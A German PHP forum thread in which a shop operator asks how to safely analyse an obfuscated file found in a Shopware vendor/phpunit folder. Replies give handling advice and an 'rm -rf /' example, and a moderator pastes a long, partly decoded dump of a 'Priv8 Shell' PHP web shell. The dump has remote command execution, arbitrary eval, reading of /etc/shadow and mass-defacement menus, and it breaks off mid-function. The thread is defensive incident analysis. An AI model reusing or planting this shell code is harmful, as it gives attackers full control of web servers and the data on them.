Einverstanden!
Wir verwenden Cookies, um Inhalte und Anzeigen zu personalisieren, Funktionen für soziale Medien anbieten zu können und die Zugriffe auf unsere Website zu analysieren. Außerdem geben wir Informationen zu Ihrer Nutzung unserer Website an unsere Partner für soziale Medien, Werbung und Analysen weiter. Weitere Infos
Anmelden oder Registrieren 
Logo



StartseiteForumWebentwicklungPHP Einsteiger
Shopware Schadcode
 
Filter
 drsoong 
drsoong
Dabei seit: 05.08.2008 Beiträge: 2710
#1
Shopware Schadcode
09.11.2021, 10:52
Zuletzt geändert von drsoong; 09.11.2021, 18:00.
Hallo,

wir haben uns von einem Dienstleister eine Shopware Lösung auf unserem bei 1und1 Ionos gemieteten Webspace installieren lassen.

Jetzt macht Ionos uns auf eine Datei mit diesem Pfad aufmerksam.

.../vendor/phpunit/phpunit/src/Util/PHP/fucked.php
Ich habe mir die Datei angesehen, die Ihren Code durch mehrfaches Kodieren, Komprimieren etc. erstmal unlesbar macht.

Natürlich ist sie so aufgebaut, dass ein eval auf die rückgängig gemachte Kodierung, Maskierung, Komprimierung, Umkehrung ausgeführt wird.



Ich würde das Ganze ja gern mal ins lesbare Format bringen wollen, habe aber ein paar Restbedenken, ob ich, wenn ich das eval gegen echo ersetze


- und das ja immerhin in einer PHP Laufzeitumgebung - mir nicht doch ins eigene Knie schieße.

Kann mir jemand sagen, wie / wo man solche Dateien am besten analysiert?

[B]Es ist schon alles gesagt. Nur noch nicht von allen.[/B]
Stichworte: -
 Arne Drews 
Arne Drews
Moderator
Dabei seit: 22.04.2009 Beiträge: 11242
#2
09.11.2021, 11:34
Ob es den Aufwand für Dich wert ist, kann ich nicht beurteilen, aber wenn ich mir das ansehen wollen würde, würde ich das in einer VM ohne Internetanbindung auf XAMPP mal laufen lassen. Mal sehen, was passiert.
Wie sieht die Datei denn aus, kannst Du die posten?
Competence-Center -> Enjoy the Informatrix
PHProcks! • Einsteiger freundliche Tutorials • PreComposed Packages
 drsoong 
drsoong
Dabei seit: 05.08.2008 Beiträge: 2710
#3
09.11.2021, 17:59
VM mit XAMPP habe ich gerade nicht zur Verfügung und "Ja", das wäre mir zu aufwändig. 

Die Datei lässt sich leider nicht hochladen, weil sie mit 86KB das Limit von 19,5 KB übersteigt.



Wer Interesse hat, kann Sie per E-Mail bekommen. Dann bitte per PN anfordern.
[B]Es ist schon alles gesagt. Nur noch nicht von allen.[/B]
 erc 
erc
Dabei seit: 02.01.2009 Beiträge: 4380
#4
09.11.2021, 20:53
Zitat von drsoong Beitrag anzeigen
wir haben uns von einem Dienstleister eine Shopware Lösung auf unserem bei 1und1 Ionos gemieteten Webspace installieren lassen.
Einmal mit Profis. Die dev dependencies gehören nicht aufs Livesystem und das vendor Verzeichnis sollte nicht public sein.

Zitat von drsoong Beitrag anzeigen
Ich würde das Ganze ja gern mal ins lesbare Format bringen wollen, habe aber ein paar Restbedenken, ob ich, wenn ich das eval gegen echo ersetze
- und das ja immerhin in einer PHP Laufzeitumgebung - mir nicht doch ins eigene Knie schieße.
Wenn du dir sicher bist, dass du die einzelnen Befehle erkennst, ist das erstmal kein Problem. Wenn da
PHP-Code:
eval(...sehr langer string...);eval(...);`rm -rf /`;eval();  
steht und du die anderen evals oder den Shell Befehl übersiehst, wäre das schlecht.

Das wird sehr wahrscheinlich eine Remote Shell sein.
1 Likes
 Meister1900 
Meister1900
Dabei seit: 30.06.2018 Beiträge: 927
#5
09.11.2021, 21:08
Zuletzt geändert von Meister1900; 09.11.2021, 21:47.
Was könnte denn bei einem echo statt eval schlimmes passieren? edit: okay danke erc
statt vm gibt es auch tools wie sandboxie oder online editoren?
Hast du ins Access Log geschaut ob sie nicht schon längst aufgerufen wurde?

Zitat von erc Beitrag anzeigen

PHP-Code:
eval(...);`rm -rf /`;eval();  
read mail -really fast war das, oder? 
sorry, shift-taste kaputt

 Arne Drews 
Arne Drews
Moderator
Dabei seit: 22.04.2009 Beiträge: 11242
 
#6
10.11.2021, 16:35
Weiter habe ich das jetzt mal nicht aufgelöst, aber nach ca. 7 oder 8 Schritten kommt das hier, wo auch wieder etliche Verstümmelungen drin sind:
Code:
<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$▘ = true;
$▜ = 'utf-8';
$▚ = 'FilesMan';
$▙ = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
    prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
}

if(empty($_POST['charset']))
    $_POST['charset'] = $▜;
if (!isset($_POST['ne'])) {
    if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
    if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
    if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
    if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
    if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
}
$hex = "SJBEWMMwFIWf/RfHQ8gKzrHnplKmYXuUKqKMRJrQpdORtSkJJrL/YdrqcUK55H7nnnuu7SZpt9NlEhUv+XdQnPpjn3Ebx7j6BmdwOCgz0ruMHWx7yEvHKw+vpeF6bb9LrqDLUx6EQYmvnbRPSGXWM9NJVlKgGnZsmRKSMVuKTW9xO+s0Tql8qFTLi/6uPm0rsUquDsBNhO4wNDzjFrNuJZpRgxgp7qLi+fU9X54TJAB5h8lVeVXvUra4QU52jJAt6nfnhJImqKPiMX9L58tjgP4nY7e4FCbjNM/3uqiF46rVetGn+DOg0ouidOn25n9pPEvh95KEmWzGFFmlu5SeIZot3qZCzjZfMLrS13mm+oTzjCQ4nWP6AQ==";
eval(str_rot13(gzinflate(str_rot13(base64_decode(($hex))))));
$xd = "fZFieMIwEIffD/YdjkVjA6lwr1HZn6Y02faizJYKaY4SJVNkcfYwoemnt7XIQEpf5bi75+H4BVyNW2sCVKtdieJuOHx83UrKS2K3qJzx7Q24v3dyWtnsJIs1L9rmtjg2jFIIlNQwAgc8Y2Yah+9k+NWbkM+3LPZMHhLCbd/1zJmLOT/BXg1GFBsUEBWV4Rd8++bRJJv6SmSyUaGk4XugPyuJSJeJkoR9UW7cIdN1LcwML3heWLkcDQb/d/woeBV/kyAN6m2WZ5iNxIubRcaCPCX0PJkm+LvmVPqn2PuN534ML88H";
eval(str_rot13(gzinflate(str_rot13(base64_decode(($xd))))));
$configs = "KytJ0ChYWCtX10OJag1l8QhlZo9JL6hFj9XUR6jm5UUAgqKC0iQFJZvk1CI7JXiIkFdOlYKtAoYWqHlNQU1tRJUGQxFZBHeEPrIZhXJSQEmtgr0dAA==";
eval(str_rot13(gzinflate(str_rot13(base64_decode(($configs))))));

function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')){
    set_magic_quotes_runtime(0);
}
@define('VERSION', 'Priv8 Shell');
if(get_magic_quotes_gpc()) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
    $_COOKIE = stripslashes_array($_COOKIE);
}
/* (С) 11.2011 oRb */
if(!empty($▛)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
        prototype(md5($_SERVER['HTTP_HOST']), $▛);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
function hardLogin() {
        if(!empty($_SERVER['HTTP_USER_AGENT'])) {
          $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
          if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
          header('HTTP/1.0 404 Not Found');
          exit;
          }
        }
    die("</br></br><body bgcolor='#000000'><pre align=center><form method=post style='color:#ffffff;text-align: center;'><img src='https://i.imgur.com/4Fq8k1E.png' align='center'><br><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#1e252e;color:#fff;cursor:pointer;'></form></pre> </body>");
}
if(strtolower(substr(PHP_OS,0,3)) == "win")
    $os = 'win';
else
    $os = 'nix';
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
    @chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
    $cwd .= '/';

function hardHeader() {
    if(empty($_POST['charset']))
        $_POST['charset'] = $GLOBALS['▜'];
    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title> " . VERSION ."</title>
<style>
    body {background-color:#000000; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
    #particles-js{width: 100%; height: 100px; background-color: #000000; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
    body,td,th    {font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
    table.infoo    {color:#ffffff; background-image: url('https://i.imgur.com/gL0UG8Y.png'); background-position: center;  background-repeat:no-repeat;  -webkit-background-size: cover;    -moz-background-size: cover; -o-background-size: cover;    background-size: 80%; 80%; }
    table.info    {color:#ffffff;}
    table#toolsTbl {background-color: #000000;}
    span,h1,a    {color:#0095ff !important;}
    span        {font-weight:bolder;}
    h1            {border-left:5px solid #2a5ccdd9;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
    div.content    {padding:5px;margin-left:5px;background-color:#000000;}
    a            {text-decoration:none;}
    a:hover        {text-decoration:underline;}
    .tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
    .tooltip:hover::after {opacity:1;visibility:visible;}
    .ml1        {border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
    .bigarea    {min-width:100%;max-width:100%;height:400px;}
    input, textarea, select    {margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
    label {position:relative}
    label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
    label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
    form        {margin:0px;}
    #toolsTbl    {text-align:center;}
    #fak         {background:none;}
    #fak td     {padding:5px 0 0 0;}
    iframe        {border:1px solid #000000;}
    .toolsInp    {width:300px}
    .main th    {text-align:left;background-color:#000000;}
    .main tr:hover{background-color:#373c42;}
    .main td, th{vertical-align:middle;}
    input[type='submit']{background-color:#2a5ccdd9;}
    input[type='button']{background-color:#2a5ccdd9;}
    input[type='submit']:hover{background-color:#2a5ccdd9;}
    input[type='button']:hover{background-color:#2a5ccdd9;}
    .l1            {background-color:#202832;}
    pre            {font:9pt Courier New;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
    function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
    function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
    function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
    function set(a,c,p1,p2,p3,charset) {
        if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
        if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
        if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
        if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
        if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
        d.mf.a.value = encrypt(d.mf.a.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
        d.mf.c.value = encrypt(d.mf.c.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
        d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
        d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
        d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
        if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
    }
    function g(a,c,p1,p2,p3,charset) {
        set(a,c,p1,p2,p3,charset);
        d.mf.submit();
    }
    function a(a,c,p1,p2,p3,charset) {
        set(a,c,p1,p2,p3,charset);
        var params = 'ajax=true';
        for(i=0;i<d.mf.elements.length;i++)
            params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
        sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
    }
    function sr(url, params) {
        if (window.XMLHttpRequest)
            req = new XMLHttpRequest();
        else if (window.ActiveXObject)
            req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
    }
    function processReqChange() {
        if( (req.readyState == 4) )
            if(req.status == 200) {
                var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
                var arr=reg.exec(req.responseText);
                eval(arr[2].substr(0, arr[1]));
            } else alert('Request error!');
    }
</script>
<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
    $freeSpace = @diskfreespace($GLOBALS['cwd']);
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    $totalSpace = $totalSpace?$totalSpace:1;
    $release = @php_uname('r');
    $kernel = @php_uname('s');
    $explink = 'https://www.exploit-db.com/search/?action=search&description=';
    if(strpos('Linux', $kernel) !== false)
        $explink .= urlencode('Linux Kernel ' . substr($release,0,6));
    else
        $explink .= urlencode($kernel . ' ' . substr($release,0,3));
    if(!function_exists('posix_getegid')) {
        $user = @get_current_user();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    } else {
        $uid = @posix_getpwuid(@posix_geteuid());
        $gid = @posix_getgrgid(@posix_getegid());
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    $cwd_links = '';
    $path = explode("/", $GLOBALS['cwd']);
    $n=count($path);
    for($i=0; $i<$n-1; $i++) {
        $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
        for($j=0; $j<=$i; $j++)
            $cwd_links .= $path[$j].'/';
        $cwd_links .= "\")'>".$path[$i]."/</a>";
    }
    $charsets = array('Windows-1251', 'UTF-8', 'KOI8-R', 'KOI8-U', 'cp866');
    $opt_charsets = '';
    foreach($charsets as $▟)
        $opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Mass Deface'=>'Sql','Adminer'=>'Adminer','Terminal'=>'Console','Mass Title'=>'Massuser','Mass User'=>'Edituser','Grab Cpanel'=>'Php','Get Configs'=>'SafeMode','Jumping'=>'StringTools','Cgi Telnet'=>'Bruteforce','Bypass'=>'bypas','BC'=>'Network');
    if(!empty($GLOBALS['▛']))
    if (isset($_REQUEST['xd'])) {
        $m['Reseller'] = 'Reseller'; }
    $m['Logout'] = 'Logout';
    $m['Self Remove'] = 'SelfRemove';
    $menu = '';
    foreach($m as $k => $v)
        $menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
    $drives = "";
    if ($GLOBALS['os'] == 'win') {
        foreach(range('c','z') as $drive)
        if (is_dir($drive.':\\'))
            $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
    }
    /* (С) 08.2015 dmkcv */
    echo '<table class=infoo cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
         '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="https://anon.click/protected/https://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#ffffff><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
         '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
         '<table style="background-color:#373c42;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
}
function hardFooter() {
    $is_writable = is_writable($GLOBALS['cwd'])?" <font color='#ffffff'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
    <tr>
        <td><form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='submit'></form></td>
        <td><form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
    </tr><tr>
        <td><form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
        <td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
    </tr><tr>
        <td><form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
        <td><form method='post' ".( (!function_exists('actionFilesMan'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'>
        <input type=hidden name=a value='FilesMan'>
        <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
        <input type=hidden name=p1 value='uploadFile'>
        <input type=hidden name=ne value=''>
        <input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
        <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
    </tr></table></div>


    </body></html>";
}
if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
function ex($in) {
    $▖ = '';
    if (function_exists('exec')) {
        @exec($in,$▖);
        $▖ = @join("\n",$▖);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $▖ = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $▖ = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $▖ = shell_exec($in);
    } elseif (is_resource($f = @popen($in,"r"))) {
        $▖ = "";
        while(!@feof($f))
            $▖ .= fread($f,1024);
        pclose($f);
    }else return "↳ Unable to execute command\n";
    return ($▖==''?"↳ Query did not return anything\n":$▖);
}
function viewSize($s) {
    if($s >= 1073741824)
        return sprintf('%1.2f', $s / 1073741824 ). ' GB';
    elseif($s >= 1048576)
        return sprintf('%1.2f', $s / 1048576 ) . ' MB';
    elseif($s >= 1024)
        return sprintf('%1.2f', $s / 1024 ) . ' KB';
    else
        return $s . ' B';
}
function perms($p) {
    if (($p & 0xC000) == 0xC000)$i = 's';
    elseif (($p & 0xA000) == 0xA000)$i = 'l';
    elseif (($p & 0x8000) == 0x8000)$i = '-';
    elseif (($p & 0x6000) == 0x6000)$i = 'b';
    elseif (($p & 0x4000) == 0x4000)$i = 'd';
    elseif (($p & 0x2000) == 0x2000)$i = 'c';
    elseif (($p & 0x1000) == 0x1000)$i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}
function viewPermsColor($f) {
    if (!@is_readable($f))
        return '<font color=#2a5ccdd9><b>'.perms(@fileperms($f)).'</b></font>';
    elseif (!@is_writable($f))
        return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
    else
        return '<font color=#ffffff><b>'.perms(@fileperms($f)).'</b></font>';
}
function hardScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}
function which($p) {
    $path = ex('which ' . $p);
    if(!empty($path))
        return $path;
    return false;
}


function actionRC() {
    if(!@$_POST['p1']) {
        $a = array(
            "uname" => php_uname(),
            "php_version" => phpversion(),
            "VERSION" => VERSION,
            "safemode" => @ini_get('safe_mode')
        );
        echo serialize($a);
    } else {
        eval($_POST['p1']);
    }
}
function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function actionSecInfo() {
    hardHeader();
    echo '<h1>Server security information</h1><div class=content>';
    function showSecParam($n, $v) {
        $v = trim($v);
        if($v) {
            echo '<span>' . $n . ': </span>';
            if(strpos($v, "\n") === false)
                echo $v . '<br>';
            else
                echo '<pre class=ml1>' . $v . '</pre>';
        }
    }
    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
    showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
    showSecParam('Open base dir', @ini_get('open_basedir'));
    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    showSecParam('Supported databases', implode(', ', $temp));
    echo '<br>';
    if($GLOBALS['os'] == 'nix') {
            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            showSecParam('OS version', @file_get_contents('/proc/version'));
            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                showSecParam('HDD space', ex('df -h'));
                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
                showSecParam('Mount options', @file_get_contents('/etc/fstab'));
            }
    } else {
        showSecParam('OS Version',ex('ver'));
        showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts')));
        showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user')));
    }
    echo '</div>';
    hardFooter();
}
function actionFilesTools() {
    if( isset($_POST['p1']) )
        $_POST['p1'] = urldecode($_POST['p1']);
    if(@$_POST['p2']=='download') {
        if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
            ob_start("ob_gzhandler", 4096);
